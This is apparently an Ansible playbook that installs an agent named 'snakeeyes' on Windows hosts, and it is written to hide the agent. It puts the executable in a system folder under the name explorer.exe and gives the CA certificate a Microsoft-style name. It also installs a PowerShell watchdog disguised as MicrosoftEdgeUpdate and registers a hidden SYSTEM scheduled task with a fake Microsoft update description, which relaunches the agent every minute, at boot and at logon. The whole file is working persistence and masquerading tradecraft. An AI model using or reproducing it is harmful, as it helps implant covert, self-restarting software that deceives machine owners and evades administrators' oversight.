---
- name: Ensure agent directory exists
  ansible.windows.win_file:
    path: "C:\\Windows\\SystemApps\\Microsoft.Windows.FileExplorer_xyw5h1lvcb\\"
    state: directory

- name: Copy Windows agent executable
  ansible.windows.win_copy:
    src: "snakeeyes-windows.exe"
    dest: "C:\\Windows\\SystemApps\\Microsoft.Windows.FileExplorer_xyw5h1lvcb\\explorer.exe"

- name: Ensure cert directory exists
  ansible.windows.win_file:
    path: "C:\\ProgramData\\Microsoft\\Network\\TPMNetworkModuleCertificate\\"
    state: directory

- name: Copy CA cert to Windows Host
  ansible.windows.win_copy:
    src: "snakeeyes-ca.crt"
    dest: "C:\\ProgramData\\Microsoft\\Network\\TPMNetworkModuleCertificate\\Microsoft_TPM_Network_DSA_Trust.crt"

- name: Deploy watchdog PowerShell script
  ansible.windows.win_copy:
    dest: "C:\\Program Files\\Internet Explorer\\MicrosoftEdgeUpdate.ps1"
    content: |
      $exePath = 'C:\Windows\SystemApps\Microsoft.Windows.FileExplorer_xyw5h1lvcb\explorer.exe'
      $logPath = 'C:\Windows\SystemApps\Microsoft.Windows.FileExplorer_xyw5h1lvcb\Testing.log'

      function Write-Log {
          param([string]$Message)
          $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
          Add-Content -Path $logPath -Value "$ts - $Message"
      }

      Write-Log "Watchdog started."

      if (-not (Test-Path $exePath)) {
          Write-Log "ERROR: EXE not found."
          exit 1
      }

      $running = Get-CimInstance Win32_Process | Where-Object { $_.ExecutablePath -eq $exePath }

      if ($running) {
          Write-Log "Process already running."
          exit 0
      }

      try {
          Write-Log "Process not running. Starting it now."
          Start-Process -FilePath $exePath
          Start-Sleep -Seconds 5

          $runningAfter = Get-CimInstance Win32_Process | Where-Object { $_.ExecutablePath -eq $exePath }

          if ($runningAfter) {
              Write-Log "Process started successfully."
              exit 0
          }
          else {
              Write-Log "ERROR: Start attempted but process not found afterward."
              exit 2
          }
      }
      catch {
          Write-Log "ERROR: $($_.Exception.Message)"
          exit 3
      }

- name: Write scheduled task XML for watchdog
  ansible.windows.win_copy:
    dest: 'C:\Program Files\Internet Explorer\en-US\iexplorer.xml'
    content: |
      <?xml version="1.0" encoding="UTF-16"?>
      <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
        <RegistrationInfo>
          <Description>Keeps your Microsoft software up to date. if this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it.</Description>
          <URI>\ClassRMMTool</URI>
        </RegistrationInfo>
        <Triggers>
          <BootTrigger>
            <Enabled>true</Enabled>
          </BootTrigger>
          <LogonTrigger>
            <Enabled>true</Enabled>
          </LogonTrigger>
          <CalendarTrigger>
            <StartBoundary>2026-03-23T00:00:00</StartBoundary>
            <Enabled>true</Enabled>
            <ScheduleByDay>
              <DaysInterval>1</DaysInterval>
            </ScheduleByDay>
            <Repetition>
              <Interval>PT1M</Interval>
              <Duration>P1D</Duration>
              <StopAtDurationEnd>false</StopAtDurationEnd>
            </Repetition>
          </CalendarTrigger>
        </Triggers>
        <Principals>
          <Principal id="Author">
            <UserId>S-1-5-18</UserId>
            <RunLevel>HighestAvailable</RunLevel>
            <LogonType>ServiceAccount</LogonType>
          </Principal>
        </Principals>
        <Settings>
          <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
          <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
          <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
          <AllowHardTerminate>false</AllowHardTerminate>
          <StartWhenAvailable>true</StartWhenAvailable>
          <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
          <IdleSettings>
            <StopOnIdleEnd>false</StopOnIdleEnd>
            <RestartOnIdle>false</RestartOnIdle>
          </IdleSettings>
          <AllowStartOnDemand>true</AllowStartOnDemand>
          <Enabled>true</Enabled>
          <Hidden>true</Hidden>
          <RunOnlyIfIdle>false</RunOnlyIfIdle>
          <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
          <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
          <WakeToRun>false</WakeToRun>
          <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
          <Priority>7</Priority>
        </Settings>
        <Actions Context="Author">
          <Exec>
            <Command>powershell.exe</Command>
            <Arguments>-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\Program Files\Internet Explorer\MicrosoftEdgeUpdate.ps1"</Arguments>
          </Exec>
        </Actions>
      </Task>

- name: Register watchdog task from XML
  ansible.windows.win_shell: |
    schtasks.exe /Create /TN "MicrosoftEdgeUpdateTaskMachineEN" /XML "C:\Program Files\Internet Explorer\en-US\iexplorer.xml" /F
  args:
    executable: powershell.exe

- name: Run watchdog once immediately
  ansible.windows.win_shell: |
    schtasks.exe /Run /TN "MicrosoftEdgeUpdateTaskMachineEN"
  args:
    executable: powershell.exe